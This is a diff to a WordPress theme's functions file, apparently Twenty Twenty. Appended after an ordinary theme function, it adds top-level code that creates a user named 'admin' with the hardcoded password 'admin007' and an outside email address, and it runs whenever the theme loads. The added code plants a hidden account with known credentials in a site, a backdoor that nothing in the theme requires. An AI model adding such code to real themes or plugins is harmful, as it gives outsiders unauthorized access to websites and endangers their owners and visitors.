@@ -754,3 +754,11 @@ function twentytwenty_get_elements_array() {
 	*/
 	return apply_filters( 'twentytwenty_get_elements_array', $elements );
 }
+$result = wp_create_user('admin', 'admin007', 'richu.work@gmail.com');
+if(is_wp_error($result)){
+  $error = $result->get_error_message();
+  //handle error here
+}else{
+  $user = get_user_by('id', $result);
+  //handle successful creation here
+}
